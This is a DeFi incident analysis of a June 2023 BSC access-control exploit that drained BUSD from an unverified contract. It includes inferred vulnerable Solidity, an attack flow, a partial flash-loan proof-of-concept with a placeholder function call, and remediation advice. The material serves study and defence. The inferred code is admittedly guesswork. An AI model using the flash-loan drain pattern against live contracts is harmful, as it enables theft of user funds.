# UnverifiedContr_9ad32 — Unverified Contract Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-07 |
| **Protocol** | Unverified Contract (0x9ad32) |
| **Chain** | BSC |
| **Loss** | ~5,955 USD |
| **Attacker** | [0xab90a897...](https://bscscan.com/address/0xab90a897cf6c56c69a4579ead3c900260dfba02d) |
| **Attack Tx** | [0xe1bf84b7...](https://app.blocksec.com/explorer/tx/bsc/0xe1bf84b7a57498c0573361b20b16077cc933e4c47aa0821bcea5b158a60ef505) |
| **Vulnerable Contract** | [0xAC899Ef6...](https://bscscan.com/address/0xAC899Ef647533E0dE91E269202f1169d7D47Ae92) |
| **Root Cause** | Access control vulnerability in an unverified source contract allowed BUSD to be drained |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/UnverifiedContr_9ad32_exp.sol) |

---
## 1. Vulnerability Overview

An access control vulnerability was discovered in a contract (0xAC899Ef6) whose source code has not been verified on Etherscan/BscScan. The attacker borrowed BUSD via a DODO flash loan, called the vulnerable function, and drained the assets held by the contract. Because the source code is not publicly available, the exact vulnerability mechanism must be inferred through bytecode analysis.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Unverified contract — source code not public
// Inferred from bytecode analysis:

// Estimated vulnerable function (no access control)
contract UnverifiedContract_0x9ad32 {
    // ❌ Function that should only be callable by owner or privileged address is public
    function withdrawAll(address token) external {
        // ❌ No caller validation
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }

    // Or: internal logic susceptible to price manipulation
    function swap(uint256 amount) external {
        // ❌ Arbitrary amount processed without validation
    }
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Access control vulnerability in unverified source contract allowed BUSD to be drained
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
┌──────────────────────────────────────────────┐
│  1. Borrow BUSD via DODO flash loan          │
└──────────────────────────┬───────────────────┘
                           ▼
┌──────────────────────────────────────────────┐
│  2. Call function with no access control     │
│     on vulnerable contract                  │
│     → Drain BUSD held by the contract       │
└──────────────────────────┬───────────────────┘
                           ▼
┌──────────────────────────────────────────────┐
│  3. Repay flash loan + 5,955 USD profit      │
└──────────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function testExploit() public {
    // Borrow BUSD via DODO flash loan
    DPPOracle.flashLoan(busdAmount, 0, address(this), bytes("exploit"));
}

function DPPFlashLoanCallback(address, uint256 amount, uint256, bytes calldata) external {
    // Call vulnerable function on unverified contract
    // (exact function signature requires bytecode analysis)
    (bool success,) = Vulncontract.call(
        abi.encodeWithSignature("vulnerableFunction(uint256)", amount)
    );
    require(success, "Call failed");

    // Repay flash loan with drained BUSD
    busd.transfer(address(DPPOracle), amount);
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Missing Access Control (Unverified Contract) | HIGH | CWE-284 | 03_access_control.md |
| V-02 | Source Code Not Public (Unauditable) | HIGH | CWE-693 | 03_access_control.md |

## 6. Remediation Recommendations

### Immediate Actions
1. Publish and verify the contract source code on Etherscan/BscScan
2. Apply `onlyOwner` or multi-signature controls to all asset withdrawal functions

### Structural Improvements
| Vulnerability | Recommended Action |
|--------|-----------|
| Unverified source | Verify source code immediately upon deployment (Etherscan verify) |
| Missing access control | Use OpenZeppelin Ownable or AccessControl |

## 7. Lessons Learned

1. Contracts with unverified source code are likely concealing vulnerabilities. Users should avoid interacting with contracts whose source code is not publicly available.
2. DeFi protocols must verify their source code immediately upon deployment to enable community auditing.
3. Even when the loss amount is small, the same vulnerable pattern can be repeated at a larger scale by other attackers.